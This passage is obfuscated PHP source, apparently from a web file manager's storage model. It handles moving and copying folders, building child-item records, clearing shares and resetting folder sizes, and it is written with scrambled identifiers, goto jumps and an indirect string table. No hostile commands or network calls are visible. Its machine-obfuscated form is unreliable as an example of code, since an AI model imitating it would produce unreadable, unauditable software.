$dèˆ›ÛÌ¤ƒ) { $Eë¶Ü¿õí = $dèˆ›ÛÌ¤ƒ[$CçÒ‹ãî²Ï[366]]; $C‹Âöù›íŞ = $this->_childrenMatch($aéµá·¾Ã”, $dèˆ›ÛÌ¤ƒ, $FÖù·§Íé“); $F¸”Ÿ½”[] = array($CçÒ‹ãî²Ï[366], $Eë¶Ü¿õí, $CçÒ‹ãî²Ï[457], $C‹Âöù›íŞ[$CçÒ‹ãî²Ï[457]]); $a—è–¹ì°Ğ[] = array($CçÒ‹ãî²Ï[366], $Eë¶Ü¿õí, $CçÒ‹ãî²Ï[455], $C‹Âöù›íŞ[$CçÒ‹ãî²Ï[455]]); $this->_copyApplyMeta($dèˆ›ÛÌ¤ƒ, $béŠ«“×ì); if ($dèˆ›ÛÌ¤ƒ[$CçÒ‹ãî²Ï[367]] != $CçÒ‹ãî²Ï[83]) { $béŠ«“×ì[$CçÒ‹ãî²Ï[497]][] = $dèˆ›ÛÌ¤ƒ[$CçÒ‹ãî²Ï[415]]; } } $this->chunkEventSet($CçÒ‹ãî²Ï[509], array($CçÒ‹ãî²Ï[510], $E¸µøÚô®Ù, $Cç­œÅ®¦Ï)); $this->saveAll($F¸”Ÿ½”); goto Aá£ÙÎ°˜; dåØ«×ë½: $FÖù·§Íé“ = $this->sourceInfo($e„¸…ÙŒ¸„); foreach ($B«›ªÂº™± as $dèˆ›ÛÌ¤ƒ) { $fãÌôÅ¼’‰ = $this->_makeItemData($dèˆ›ÛÌ¤ƒ, $FÖù·§Íé“, $dèˆ›ÛÌ¤ƒ[$CçÒ‹ãî²Ï[28]]); $fãÌôÅ¼’‰[$CçÒ‹ãî²Ï[455]] = $dèˆ›ÛÌ¤ƒ[$CçÒ‹ãî²Ï[455]]; $AäÀÉ’«ƒç[] = $fãÌôÅ¼’‰; } $this->chunkEventSet($CçÒ‹ãî²Ï[507], array($CçÒ‹ãî²Ï[508], $E¸µøÚô®Ù, $Cç­œÅ®¦Ï)); goto eò˜ŠŠ¼øÈ; e£‰‰‚æ¼Æ: $E¸µøÚô®Ù = $this->_makeItemData($D‡ôÊğä¾, $có³ªëá½, $B‰‘ĞÀšÙ™); Hook::trigger($CçÒ‹ãî²Ï[504], $E¸µøÚô®Ù); Hook::trigger($CçÒ‹ãî²Ï[505], array($CçÒ‹ãî²Ï[506], $E¸µøÚô®Ù, 0)); goto Fïà×çñÇ†; Aá£ÙÎ°˜: $this->chunkEventSet($CçÒ‹ãî²Ï[511], array($CçÒ‹ãî²Ï[512], $E¸µøÚô®Ù, $Cç­œÅ®¦Ï)); $this->saveAll($a—è–¹ì°Ğ); return $e„¸…ÙŒ¸„; goto e©‰¼ñ¦¼½; Fïà×çñÇ†: $e„¸…ÙŒ¸„ = $this->add($E¸µøÚô®Ù); $E³„è²ŞÜà = array($CçÒ‹ãî²Ï[366] => $e„¸…ÙŒ¸„, $CçÒ‹ãî²Ï[28] => $B‰‘ĞÀšÙ™); $this->_copyApplyMeta($E³„è²ŞÜà, $béŠ«“×ì); goto eõÁ°×êêÇ; e©‰¼ñ¦¼½: } private function _childrenMakeRelation($a‰ß‰Ü´åé, $F¿Ôš™œ©) { $F®ò½Ú‡Åø =& $_SERVER[¢à]; $c©©ãÍÒ‹Ò = array(); $cï­äÅİÂÁ = array(); foreach ($a‰ß‰Ü´åé as $FƒÒÆ°ãã ) { $aÈÔÍ ô‘ë = $FƒÒÆ°ãã [$F®ò½Ú‡Åø[28]] . $F®ò½Ú‡Åø[8] . $FƒÒÆ°ãã [$F®ò½Ú‡Åø[455]]; $c©©ãÍÒ‹Ò[$aÈÔÍ ô‘ë] = $FƒÒÆ°ãã [$F®ò½Ú‡Åø[366]]; } foreach ($F¿Ôš™œ© as $FƒÒÆ°ãã ) { $aÈÔÍ ô‘ë = $FƒÒÆ°ãã [$F®ò½Ú‡Åø[28]] . $F®ò½Ú‡Åø[8] . $FƒÒÆ°ãã [$F®ò½Ú‡Åø[455]]; $Aõ®££Ü¬ = $c©©ãÍÒ‹Ò[$aÈÔÍ ô‘ë]; $cï­äÅİÂÁ[$Aõ®££Ü¬] = $FƒÒÆ°ãã [$F®ò½Ú‡Åø[366]]; } return $cï­äÅİÂÁ; } private function _childrenMatch($dµÓÎ…³, $AÓšÊõë†, $AÀŠí°’ÒÇ) { goto B…Ş¹Úøµ­; Cä…ÄŞ–Ã–: foreach ($AˆÕª¯Çä as $b‹­ŠñãÄ) { if (isset($dµÓÎ…³[$b‹­ŠñãÄ])) { $A¡À‚êƒ½ .= $dµÓÎ…³[$b‹­ŠñãÄ] . $cáÄØ á”ƒ[513]; } } $A¡À‚êƒ½ = rtrim($A¡À‚êƒ½, $cáÄØ á”ƒ[47]) . $cáÄØ á”ƒ[47]; $C«àˆ´ô± = $this->parentLevelArray($A¡À‚êƒ½); goto dÀçé‹¹¡‹; B…Ş¹Úøµ­: $cáÄØ á”ƒ =& $_SERVER[¢à]; $A¡À‚êƒ½ = $AÀŠí°’ÒÇ[$cáÄØ á”ƒ[455]]; $AˆÕª¯Çä = $this->parentLevelArray($AÓšÊõë†[$cáÄØ á”ƒ[455]]); goto Cä…ÄŞ–Ã–; dÀçé‹¹¡‹: $eÔïÉ§¯§ä = $C«àˆ´ô±[count($C«àˆ´ô±) - 1]; return array($cáÄØ á”ƒ[457] => $eÔïÉ§¯§ä, $cáÄØ á”ƒ[455] => $A¡À‚êƒ½); goto Fæ•ëƒ”†©; Fæ•ëƒ”†©: } private function _makeItemData($A¦Šî½»ºŒ, $cƒ˜Â¸±î´, $AÓä×ßÆ›«) { $b‚í“Úø—« =& $_SERVER[¢à]; $Aèõé…õ = array($b‚í“Úø—«[514] => $A¦Šî½»ºŒ[$b‚í“Úø—«[367]], $b‚í“Úø—«[383] => $AÓä×ßÆ›«, $b‚í“Úø—«[515] => $A¦Šî½»ºŒ[$b‚í“Úø—«[369]], $b‚í“Úø—«[416] => $A¦Šî½»ºŒ[$b‚í“Úø—«[415]], $b‚í“Úø—«[516] => $A¦Šî½»ºŒ[$b‚í“Úø—«[77]], $b‚í“Úø—«[517] => $cƒ˜Â¸±î´[$b‚í“Úø—«[368]], $b‚í“Úø—«[518] => $cƒ˜Â¸±î´[$b‚í“Úø—«[452]], $b‚í“Úø—«[519] => USER_ID, $b‚í“Úø—«[520] => USER_ID, $b‚í“Úø—«[365] => $cƒ˜Â¸±î´[$b‚í“Úø—«[366]], $b‚í“Úø—«[521] => $cƒ˜Â¸±î´[$b‚í“Úø—«[455]] . $cƒ˜Â¸±î´[$b‚í“Úø—«[366]] . $b‚í“Úø—«[47], $b‚í“Úø—«[392] => 0, $b‚í“Úø—«[522] => $b‚í“Úø—«[33]); return $Aèõé…õ; } private function _copyApplyMeta($BáÚ·Ø¥, &$EÙôÁˆ‚™º) { $BÅ©ìŒô£í =& $_SERVER[¢à]; $CÒƒèƒìõ = $BáÚ·Ø¥[$BÅ©ìŒô£í[366]]; $Fà‡´™ó–Ä = $BáÚ·Ø¥[$BÅ©ìŒô£í[28]]; if (!isset($BáÚ·Ø¥[$BÅ©ìŒô£í[523]]) || !$BáÚ·Ø¥[$BÅ©ìŒô£í[523]] || $BáÚ·Ø¥[$BÅ©ìŒô£í[523]] == $BÅ©ìŒô£í[464]) { $EÙôÁˆ‚™º[$BÅ©ìŒô£í[499]][] = array($BÅ©ìŒô£í[366], $CÒƒèƒìõ, $BÅ©ìŒô£í[523], short_id($CÒƒèƒìõ)); } if (Input::check($Fà‡´™ó–Ä, $BÅ©ìŒô£í[524])) { $EÙôÁˆ‚™º[$BÅ©ìŒô£í[498]][] = array($BÅ©ìŒô£í[366] => $CÒƒèƒìõ, $BÅ©ìŒô£í[89] => $BÅ©ìŒô£í[412], $BÅ©ìŒô£í[356] => str_replace($BÅ©ìŒô£í[50], $BÅ©ìŒô£í[33], Pinyin::encode($Fà‡´™ó–Ä))); $EÙôÁˆ‚™º[$BÅ©ìŒô£í[498]][] = array($BÅ©ìŒô£í[366] => $CÒƒèƒìõ, $BÅ©ìŒô£í[89] => $BÅ©ìŒô£í[411], $BÅ©ìŒô£í[356] => Pinyin::encode($Fà‡´™ó–Ä, $BÅ©ìŒô£í[525])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($d‚Çé¶ÛšÌ) { goto BÌÑŸŒ‚°ô; BÌÑŸŒ‚°ô: $BÉÑâ¸±Íî =& $_SERVER[¢à]; $e¯¥ëñøäÆ = $this->sourceInfo($d‚Çé¶ÛšÌ); $c¶Ø­Ü = $BÉÑâ¸±Íî[526]; goto CàÆ å©Í˜; c‡–Á‰ÅÄì: $cñê¦“®çÖ = array_to_keyvalue($cñê¦“®çÖ, $BÉÑâ¸±Íî[366]); foreach ($cñê¦“®çÖ as $D¬çñÙòÂ) { $Fƒ‡±«ì—å = $D¬çñÙòÂ[$BÉÑâ¸±Íî[457]]; $d‚Çé¶ÛšÌ = $D¬çñÙòÂ[$BÉÑâ¸±Íî[366]]; if (!isset($this->_childrenListCache[$d‚Çé¶ÛšÌ]) && $D¬çñÙòÂ[$BÉÑâ¸±Íî[367]] == $BÉÑâ¸±Íî[83]) { $this->_childrenListCache[$d‚Çé¶ÛšÌ] = array(); } if (!isset($this->_childrenListCache[$Fƒ‡±«ì—å])) { $this->_childrenListCache[$Fƒ‡±«ì—å] = array(); } $this->_childrenListCache[$Fƒ‡±«ì—å][$d‚Çé¶ÛšÌ] = $D¬çñÙòÂ; $this->_childrenItemCache[$d‚Çé¶ÛšÌ] = $D¬çñÙòÂ; } goto a®Ç ­¾’; CàÆ å©Í˜: $B’¬ö¯÷‘ö = array($BÉÑâ¸±Íî[455] => array($BÉÑâ¸±Íî[479], $e¯¥ëñøäÆ[$BÉÑâ¸±Íî[455]] . $d‚Çé¶ÛšÌ . $BÉÑâ¸±Íî[480]), $BÉÑâ¸±Íî[393] => $this->targetIsDelete); $cñê¦“®çÖ = $this->field($c¶Ø­Ü)->where($B’¬ö¯÷‘ö)->select(); if (!$cñê¦“®çÖ) { return; } goto c‡–Á‰ÅÄì; a®Ç ­¾’: } private function _childrenListAll($FÌİˆ–ë“¶, &$b¹…ÌæÀë™) { $eŒÕ†Æ»ø¸ =& $_SERVER[¢à]; if (!isset($this->_childrenListCache[$FÌİˆ–ë“¶])) { return; } $E¼°¬’’… = $this->_childrenListCache[$FÌİˆ–ë“¶]; foreach ($E¼°¬’’… as $E§·±šœ× => $E«Şè‚ñÔ«) { $b¹…ÌæÀë™[$E§·±šœ×] = $E«Şè‚ñÔ«; if ($E«Şè‚ñÔ«[$eŒÕ†Æ»ø¸[367]] == $eŒÕ†Æ»ø¸[83]) { $this->_childrenListAll($E§·±šœ×, $b¹…ÌæÀë™); } } } private function sourceInfoCache($CŒƒ¿ë¸ö) { if (isset($this->_childrenItemCache[$CŒƒ¿ë¸ö])) { return $this->_childrenItemCache[$CŒƒ¿ë¸ö]; } return $this->sourceInfo($CŒƒ¿ë¸ö); } private function _childrenList($CƒïâîØÕ™) { if (isset($this->_childrenListCache[$CƒïâîØÕ™])) { return $this->_childrenListCache[$CƒïâîØÕ™]; } return $this->_childrenListSelect($CƒïâîØÕ™); } private function _childrenListSelect($eğÌ¾´­óï) { goto DšÔÁ•Ò»; A‰ÁËÒù¢®: foreach ($C„¾¡íƒİ– as $eğÌ¾´­óï => $BÅñéÍ»æç) { $this->_childrenItemCache[$eğÌ¾´­óï] = $BÅñéÍ»æç; } return $C„¾¡íƒİ–; goto fÊğ‹×Á”…; B»ºóÌ«›‡: $bŒõ›‰¦´ = $bŒõ›‰¦´ ? $bŒõ›‰¦´ : array(); $C„¾¡íƒİ– = array_to_keyvalue($bŒõ›‰¦´, $e”¢™À‡[366]); $this->_childrenListCache[$eğÌ¾´­óï] = $C„¾¡íƒİ–; goto A‰ÁËÒù¢®; DšÔÁ•Ò»: $e”¢™À‡ =& $_SERVER[¢à]; $bœŸŒ½“¤ = array($e”¢™À‡[457] => $eğÌ¾´­óï, $e”¢™À‡[393] => $this->targetIsDelete); $bŒõ›‰¦´ = $this->where($bœŸŒ½“¤)->select(); goto B»ºóÌ«›‡; fÊğ‹×Á”…: } private function fileNameExistCache($Bƒ‹Ù‹á¸å, $F²Š©î›–â) { $dˆ‰ÛëÂØí =& $_SERVER[¢à]; $F²Š©î›–â = strtolower($F²Š©î›–â); $eÆ™ÒÑ•õ£ = $this->_childrenList($Bƒ‹Ù‹á¸å); foreach ($eÆ™ÒÑ•õ£ as $EÕéŠÈÙÏ–) { if ($F²Š©î›–â == strtolower($EÕéŠÈÙÏ–[$dˆ‰ÛëÂØí[28]])) { return $EÕéŠÈÙÏ–[$dˆ‰ÛëÂØí[366]]; } } return !1; } private function fileNameAutoCache($bƒÚªèº•, $EÎ”‰Ê›œá, $cŠÊÓÈ°’Ø, $fÊ˜ƒ¤¡•Š) { $aâ¿¸–‚•Ø =& $_SERVER[¢à]; $DÁÈ‚¨ÃÏ÷ = $this->_childrenList($bƒÚªèº•); $e™µ¨„‚ = array_to_keyvalue($DÁÈ‚¨ÃÏ÷, $aâ¿¸–‚•Ø[33], $aâ¿¸–‚•Ø[28]); return $this->fileNameAutoGet($e™µ¨„‚, $EÎ”‰Ê›œá, $cŠÊÓÈ°’Ø, $fÊ˜ƒ¤¡•Š); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($eŞäÇ‰ßÖ, $ešš‹‘œé, $FØˆºé¶•“ = REPEAT_REPLACE, $b¨Óõç”¢‹ = '') { goto fº·õÛŠ÷Ì; d¦ÁâÎÌÃ: Model($BŠŸ‚‚¼ºÑ[164])->linkAdd($aÛæ¾‚ßÙ“[$BŠŸ‚‚¼ºÑ[497]]); if ($C…»Ä¦Š±ù && $aÛæ¾‚ßÙ“[$BŠŸ‚‚¼ºÑ[529]]) { $this->removeNow($eŞäÇ‰ßÖ, !1); } $this->lockMoveEnd($eŞäÇ‰ßÖ); goto f÷‹‰öµ‹»; Fì®ØÒÒè: $aÛæ¾‚ßÙ“ = array($BŠŸ‚‚¼ºÑ[497] => array(), $BŠŸ‚‚¼ºÑ[529] => !1); $this->clearShare($eŞäÇ‰ßÖ, $ešš‹‘œé); $C…»Ä¦Š±ù = $this->fileNameExistCache($ešš‹‘œé, $B‡ŠÍ‡áÙ¸[$BŠŸ‚‚¼ºÑ[28]]); goto E¬Ù¼íŸÀÖ; Dßä§×ª‡³: Model($BŠŸ‚‚¼ºÑ[501])->eventMove($eŞäÇ‰ßÖ, $B‡ŠÍ‡áÙ¸[$BŠŸ‚‚¼ºÑ[457]], $ešš‹‘œé); Hook::trigger($BŠŸ‚‚¼ºÑ[528], $F¨Ğµİ”ÎÕ); return $cî¹¦”Å”í; goto A­®×İªò©; aîÄÖßâ¸: $F¨Ğµİ”ÎÕ = $this->pathInfoMore($eŞäÇ‰ßÖ); if ($this->isParentOf($eŞäÇ‰ßÖ, $ešš‹‘œé)) { return !1; } if (!$B‡ŠÍ‡áÙ¸ || !$EÎöÏˆŒÖ  || $EÎöÏˆŒÖ [$BŠŸ‚‚¼ºÑ[367]] != $BŠŸ‚‚¼ºÑ[83]) { return !1; } goto d¼ïì§¤ã¬; d¼ïì§¤ã¬: Hook::trigger($BŠŸ‚‚¼ºÑ[527], $F¨Ğµİ”ÎÕ); $this->targetIsDelete = intval($B‡ŠÍ‡áÙ¸[$BŠŸ‚‚¼ºÑ[393]]); if ($B‡ŠÍ‡áÙ¸[$BŠŸ‚‚¼ºÑ[457]] == $ešš‹‘œé && $b¨Óõç”¢‹ != $B‡ŠÍ‡áÙ¸[$BŠŸ‚‚¼ºÑ[28]]) { $D°ç’˜ĞÓ = $this->fileNameExist($ešš‹‘œé, $b¨Óõç”¢‹); if ($D°ç’˜ĞÓ && $B‡ŠÍ‡áÙ¸[$BŠŸ‚‚¼ºÑ[367]] == $BŠŸ‚‚¼ºÑ[464]) { goto c´‹–àé´ˆ; a®«‘™¬ˆ: $this->removeNow($eŞäÇ‰ßÖ, !1); $this->folderSizeReset($ešš‹‘œé); Hook::trigger($BŠŸ‚‚¼ºÑ[528], $F¨Ğµİ”ÎÕ); goto eîéÃ¥°¨; eîéÃ¥°¨: return $D°ç’˜ĞÓ; goto d†ß–ƒªé£; c´‹–àé´ˆ: $FÓ™êô‚¹Ø = $this->sourceInfo($D°ç’˜ĞÓ); $dº³­¢ùƒ§ = $this->fileHistory($FÓ™êô‚¹Ø, $B‡ŠÍ‡áÙ¸[$BŠŸ‚‚¼ºÑ[415]], $B‡ŠÍ‡áÙ¸[$BŠŸ‚‚¼ºÑ[77]]); if (!$dº³­¢ùƒ§) { Model($BŠŸ‚‚¼ºÑ[418])->remove($B‡ŠÍ‡áÙ¸[$BŠŸ‚‚¼ºÑ[415]]); } goto a®«‘™¬ˆ; d†ß–ƒªé£: } } goto B½‹ØîŞ£; f÷‹‰öµ‹»: $this->lockWriteEnd($ešš‹‘œé, $B“·öè³†ã); $this->folderSizeReset($B‡ŠÍ‡áÙ¸[$BŠŸ‚‚¼ºÑ[457]]); $this->folderSizeReset($ešš‹‘œé); goto Eã¹¦Ã‚‘Æ; B½‹ØîŞ£: $B“·öè³†ã = $b¨Óõç”¢‹ ? $b¨Óõç”¢‹ : $B‡ŠÍ‡áÙ¸[$BŠŸ‚‚¼ºÑ[28]]; $this->lockMoveStart($eŞäÇ‰ßÖ); $this->lockWriteStart($ešš‹‘œé, $B“·öè³†ã); goto Fì®ØÒÒè; fº·õÛŠ÷Ì: $BŠŸ‚‚¼ºÑ =& $_SERVER[¢à]; $B‡ŠÍ‡áÙ¸ = $this->sourceInfo($eŞäÇ‰ßÖ); $EÎöÏˆŒÖ  = $this->sourceInfo($ešš‹‘œé); goto aîÄÖßâ¸; E¬Ù¼íŸÀÖ: $cî¹¦”Å”í = $this->_move($eŞäÇ‰ßÖ, $ešš‹‘œé, $FØˆºé¶•“, $aÛæ¾‚ßÙ“, $b¨Óõç”¢‹); $this->sourceCacheClear(); if ($B‡ŠÍ‡áÙ¸[$BŠŸ‚‚¼ºÑ[367]] == $BŠŸ‚‚¼ºÑ[83] && $C…»Ä¦Š±ù) { $this->folderSizeResetChildren($cî¹¦”Å”í); } goto d¦ÁâÎÌÃ; Eã¹¦Ã‚‘Æ: $AŒãá¨·— = array($B‡ŠÍ‡áÙ¸[$BŠŸ‚‚¼ºÑ[457]], $ešš‹‘œé); if ($B‡ŠÍ‡áÙ¸[$BŠŸ‚‚¼ºÑ[367]] == $BŠŸ‚‚¼ºÑ[83]) { $AŒãá¨·—[] = $eŞäÇ‰ßÖ; } $this->updateModifyTime($AŒãá¨·—); goto Dßä§×ª‡³; A­®×İªò©: } private function _move($Eµ¤øÍ£Ú’, $A¬®åìø„ø, $a»¨ ¤Ìƒ‰, &$C‰ó‚ò¦ß‰, $Dõï—Œ¤Ø = '') { goto b©¡¨ß×¬ˆ; Aá·Ã‰î: $this->lockWriteStart($A¬®åìø„ø, $fìˆ°½Âš¾); if (!$E©¿×¹¢’Ó) { return $this->_moveForce($Eµ¤øÍ£Ú’, $A¬®åìø„ø, $fìˆ°½Âš¾); } $eèª…Ê™ = $E©¿×¹¢’Ó; goto fšñù‡×; F³­Ì†ÈËä: $fìˆ°½Âš¾ = $Dõï—Œ¤Ø ? $Dõï—Œ¤Ø : $A…ø‰©‹¾[$c à²°™ñ[28]]; $E©¿×¹¢’Ó = $this->fileNameExistCache($A¬®åìø„ø, $fìˆ°½Âš¾); $this->lockMoveStart($Eµ¤øÍ£Ú’); goto Aá·Ã‰î; fšñù‡×: $bó¸†èå´‹ = !1; if ($B­µ‘…³‹¯) { if ($a»¨ ¤Ìƒ‰ == REPEAT_RENAME_FOLDER) { $fìˆ°½Âš¾ = $this->fileNameAuto($A¬®åìø„ø, $fìˆ°½Âš¾, $a»¨ ¤Ìƒ‰, $B­µ‘…³‹¯); $eèª…Ê™ = $this->_moveForce($Eµ¤øÍ£Ú’, $A¬®åìø„ø, $fìˆ°½Âš¾); } else { if ($a»¨ ¤Ìƒ‰ == REPEAT_RENAME_FOLDER) { $a»¨ ¤Ìƒ‰ = REPEAT_RENAME; } $D„ÊÑªØ¿‘ = $this->_childrenListSelect($Eµ¤øÍ£Ú’); foreach ($D„ÊÑªØ¿‘ as $dí¦õ”ùÎÀ) { $this->_move($dí¦õ”ùÎÀ[$c à²°™ñ[366]], $E©¿×¹¢’Ó, $a»¨ ¤Ìƒ‰, $C‰ó‚ò¦ß‰); } $bó¸†èå´‹ = !0; } } else { if ($a»¨ ¤Ìƒ‰ == REPEAT_SKIP) { $bó¸†èå´‹ = !0; } else { if ($a»¨ ¤Ìƒ‰ == REPEAT_RENAME || $a»¨ ¤Ìƒ‰ == REPEAT_RENAME_FOLDER) { $fìˆ°½Âš¾ = $this->fileNameAuto($A¬®åìø„ø, $fìˆ°½Âš¾, $a»¨ ¤Ìƒ‰, $B­µ‘…³‹¯); $eèª…Ê™ = $this->_moveForce($Eµ¤øÍ£Ú’, $A¬®åìø„ø, $fìˆ°½Âš¾); } else { if ($a»¨ ¤Ìƒ‰ == REPEAT_REPLACE) { $f“ˆğ¤îö = $this->sourceInfoCache($E©¿×¹¢’Ó); $bÍø„‘Ü¬ = $this->fileHistory($f“ˆğ¤îö, $A…ø‰©‹¾[$c à²°™ñ[415]], $A…ø‰©‹¾[$c à²°™ñ[77]]); if ($bÍø„‘Ü¬) { $C‰ó‚ò¦ß‰[$c à²°™ñ[497]][] = $A…ø‰©‹¾[$c à²°™ñ[415]]; } else { $bó¸†èå´‹ = !0; } } } } } if ($bó¸†èå´‹ && !$C‰ó‚ò¦ß‰[$c à²°™ñ[529]]) { $C‰ó‚ò¦ß‰[$c à²°™ñ[529]] = !0; } goto CÉ²ƒÍÕØè; CÉ²ƒÍÕØè: return $eèª…Ê™; goto BâÓ¿³ŒØ; b©¡¨ß×¬ˆ: $c à²°™ñ =& $_SERVER[¢à]; $A…ø‰©‹¾ = $this->sourceInfo($Eµ¤øÍ£Ú’); $B­µ‘…³‹¯ = $A…ø‰©‹¾[$c à²°™ñ[367]] == $c à²°™ñ[83]; goto F³­Ì†ÈËä; BâÓ¿³ŒØ: } private function _moveForce($eå±àšè…, $c£æòŒ³ß, $bì§Ú¡İ°) { goto bÄ¬¿¾¡Š; E‡á™—¤ö: if ($e…æêŞÔ ) { $cêù¸‚ßÔ¸ = array($Aáª…Ş‚ÍŠ[521] => array($Aáª…Ş‚ÍŠ[479], $Dˆ¸ä‹í¯[$Aáª…Ş‚ÍŠ[455]] . $Dˆ¸ä‹í¯[$Aáª…Ş‚ÍŠ[366]] . $Aáª…Ş‚ÍŠ[480])); $bëè”Ó‰Ô = $Dˆ¸ä‹í¯[$Aáª…Ş‚ÍŠ[455]] . $Dˆ¸ä‹í¯[$Aáª…Ş‚ÍŠ[366]] . $Aáª…Ş‚ÍŠ[47]; $d¸ê‹’©‹í = $A¡—„“ÇŒ[$Aáª…Ş‚ÍŠ[455]] . $A¡—„“ÇŒ[$Aáª…Ş‚ÍŠ[366]] . $Aáª…Ş‚ÍŠ[47] . $Dˆ¸ä‹í¯[$Aáª…Ş‚ÍŠ[366]] . $Aáª…Ş‚ÍŠ[47]; $AÈç—¢£³ö = array($Aáª…Ş‚ÍŠ[521] => array($Aáª…Ş‚ÍŠ[530], "\x72\145\160\154\141\143\145\x28\160\x61\162\x65\156\x74\x4c\145\x76\145\x6c\54\x27{$bëè”Ó‰Ô}\47\54\47{$d¸ê‹’©‹í}\47\x29"), $Aáª…Ş‚ÍŠ[517] => $A¡—„“ÇŒ[$Aáª…Ş‚ÍŠ[368]], $Aáª…Ş‚ÍŠ[518] => $A¡—„“ÇŒ[$Aáª…Ş‚ÍŠ[452]]); if ($f›ä–áŒÊë) { $AÈç—¢£³ö[$Aáª…Ş‚ÍŠ[392]] = 0; } $this->where($cêù¸‚ßÔ¸)->data($AÈç—¢£³ö)->save(); } $this->where(array($Aáª…Ş‚ÍŠ[380] => $eå±àšè…))->data($f½İÀ‘Š¾)->save(); return $eå±àšè…; goto aĞç†Ø´ó; CƒÂâš“’’: if (!$A³ºÂâ„«ö) { Model($Aáª…Ş‚ÍŠ[450])->authClear($eå±àšè…); } $f›ä–áŒÊë = $Dˆ¸ä‹í¯[$Aáª…Ş‚ÍŠ[393]] == $Aáª…Ş‚ÍŠ[83] && $A¡—„“ÇŒ[$Aáª…Ş‚ÍŠ[393]] != $Aáª…Ş‚ÍŠ[83]; if ($f›ä–áŒÊë) { $f½İÀ‘Š¾[$Aáª…Ş‚ÍŠ[392]] = 0; } goto E‡á™—¤ö; DÅÍØÓÁÀ‚: $e…æêŞÔ  = $Dˆ¸ä‹í¯[$Aáª…Ş‚ÍŠ[367]] == $Aáª…Ş‚ÍŠ[83]; $f½İÀ‘Š¾ = array($Aáª…Ş‚ÍŠ[365] => $A¡—„“ÇŒ[$Aáª…Ş‚ÍŠ[366]], $Aáª…Ş‚ÍŠ[521] => $A¡—„“ÇŒ[$Aáª…Ş‚ÍŠ[455]] . $A¡—„“ÇŒ[$Aáª…Ş‚ÍŠ[366]] . $Aáª…Ş‚ÍŠ[47], $Aáª…Ş‚ÍŠ[517] => $A¡—„“ÇŒ[$Aáª…Ş‚ÍŠ[368]], $Aáª…Ş‚ÍŠ[518] => $A¡—„“ÇŒ[$Aáª…Ş‚ÍŠ[452]], $Aáª…Ş‚ÍŠ[520] => USER_ID, $Aáª…Ş‚ÍŠ[383] => $bì§Ú¡İ°); $A³ºÂâ„«ö = $Dˆ¸ä‹í¯[$Aáª…Ş‚ÍŠ[368]] == SourceModel::TYPE_GROUP && $A¡—„“ÇŒ[$Aáª…Ş‚ÍŠ[368]] == SourceModel::TYPE_GROUP && $Dˆ¸ä‹í¯[$Aáª…Ş‚ÍŠ[452]] == $A¡—„“ÇŒ[$Aáª…Ş‚ÍŠ[452]]; goto CƒÂâš“’’; bÄ¬¿¾¡Š: $Aáª…Ş‚ÍŠ =& $_SERVER[¢à]; $Dˆ¸ä‹í¯ = $this->sourceInfo($eå±àšè…); $A¡—„“ÇŒ = $this->sourceInfo($c£æòŒ³ß); goto DÅÍØÓÁÀ‚; aĞç†Ø´ó: } private function clearShare($a¯´¦÷Ûñ¼, $dÍÜ±Ö) { goto B›Şğ“ë¬Ä; B†ó«Ïš×—: if (!$E÷ÊãË°¼) { return; } $E÷ÊãË°¼ = array_to_keyvalue($E÷ÊãË°¼, $ešëÍÖÍƒ„[33], $ešëÍÖÍƒ„[437]); $fİ¦­¨‘íË = array($ešëÍÖÍƒ„[437] => array($ešëÍÖÍƒ„[7], $E÷ÊãË°¼)); goto DøË‚âÖèæ; e‘²ÏÈó¾ƒ: if ($E«òã¼âÄ„[$ešëÍÖÍƒ„[452]] == $a™ˆÖ‚ğ‰¢[$ešëÍÖÍƒ„[452]] && $E«òã¼âÄ„[$ešëÍÖÍƒ„[368]] == $ešëÍÖÍƒ„[531]) { return; } $fİ¦­¨‘íË = array($ešëÍÖÍƒ„[455] => array($ešëÍÖÍƒ„[479], $E«òã¼âÄ„[$ešëÍÖÍƒ„[455]] . $a¯´¦÷Ûñ¼ . $ešëÍÖÍƒ„[480])); $CÙ–³êš· = $this->field($ešëÍÖÍƒ„[380])->where($fİ¦­¨‘íË)->getField($ešëÍÖÍƒ„[366], !0); goto AÙëäÆï™ò; B›Şğ“ë¬Ä: $ešëÍÖÍƒ„ =& $_SERVER[¢à]; $E«òã¼âÄ„ = $this->sourceInfo($a¯´¦÷Ûñ¼); $a™ˆÖ‚ğ‰¢ = $this->sourceInfo($dÍÜ±Ö); goto e‘²ÏÈó¾ƒ; AÙëäÆï™ò: if (!$CÙ–³êš·) { return; } $fİ¦­¨‘íË = array($ešëÍÖÍƒ„[366] => array($ešëÍÖÍƒ„[7], $CÙ–³êš·), $ešëÍÖÍƒ„[444] => 1); $E÷ÊãË°¼ = Model($ešëÍÖÍƒ„[532])->field($ešëÍÖÍƒ„[437])->where($fİ¦­¨‘íË)->select(); goto B†ó«Ïš×—; DøË‚âÖèæ: Model($ešëÍÖÍƒ„[532])->where($fİ¦­¨‘íË)->save(array($ešëÍÖÍƒ„[444] => 0)); Model($ešëÍÖÍƒ„[533])->where($fİ¦­¨‘íË)->delete(); goto b£ÁëÙ£Ëî; b£ÁëÙ£Ëî: } public function copyFolderFromIO($b„È‚àÆ„Ú, $dÈÉÓÌËíö, $EËÃ‰İÍá—, $F‚Ï†Ğí†È, $BÄ‰÷ÂÄ , $a„Ï†í½·ï = false) { goto d†ÕÒĞ¢õ·; bøáÜ‚ªà: Model($DÂ‘Ğæ¶âÃ[418])->linkAdd($AÑ—÷Ğ´“ä[$DÂ‘Ğæ¶âÃ[497]]); Model($DÂ‘Ğæ¶âÃ[418])->remove($AÑ—÷Ğ´“ä[$DÂ‘Ğæ¶âÃ[534]]); $this->folderSizeReset($EËÃ‰İÍá—); goto AÖîö½‘òÇ; C¯”ê…Ö: Model($DÂ‘Ğæ¶âÃ[500])->addAll($AÑ—÷Ğ´“ä[$DÂ‘Ğæ¶âÃ[498]], array(), !0); Model($DÂ‘Ğæ¶âÃ[501])->eventCopy($CõÁÀ¶‘’); $this->saveAll($AÑ—÷Ğ´“ä[$DÂ‘Ğæ¶âÃ[499]]); goto bøáÜ‚ªà; BÙİŸš²…: if ($eÂÕ¶ä­Â) { $this->_childrenAllMake($eÂÕ¶ä­Â); } Hook::trigger($DÂ‘Ğæ¶âÃ[535]); $this->_copyChildTo($b„È‚àÆ„Ú, $dÈÉÓÌËíö, $CõÁÀ¶‘’, $F‚Ï†Ğí†È, $AÑ—÷Ğ´“ä, $BÄ‰÷ÂÄ ); goto d³à•¦½•; 